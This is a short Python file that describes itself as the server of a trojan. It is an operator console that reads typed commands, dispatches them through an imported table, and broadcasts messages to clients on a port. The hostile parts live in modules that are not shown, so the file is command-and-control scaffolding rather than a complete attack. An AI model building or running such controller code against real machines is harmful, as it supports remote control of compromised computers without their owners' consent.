"""Server of a Trojan."""

from Server.servers import SERVERS, close_all_servers, close_server_by_name
from Server.config import ciphers, PORT, FORMAT
from Server.exceptions import AccessDenied, CloseServer

import sys
import logging
import time

from tqdm import trange
import coloredlogs

logging.basicConfig(filename="logfilename.log", level=logging.INFO)
logger = logging.getLogger(__name__)
coloredlogs.install(level='WARNING')


def broadcast(msg: str) -> None:
    """Broadcast to all"""

    SERVERS["broadcast"].sendto(msg, ('<broadcast>', PORT)) # broadcast on specified port


def main() -> None:
    while not ciphers.get((cmd := input("> ")), lambda: False)():
        print(cmd)
        # SERVERS["p2p"].sendto(bytes(cmd, FORMAT), (addr, port))

    close_all_servers()


if __name__ == '__main__':
    while True:
        try:
            main()
        except KeyboardInterrupt:
            logger.warning(f" [PRIVILAGE] Only admins can close the Server, type @help for help")
        except CloseServer:
            break
        except AccessDenied as e:
            logger.warning(f" [PRIVILAGE] TIMEOUT BECAUSE: {e}")
            for _ in trange(10):
                time.sleep(1) # 10 * 1sec sleep
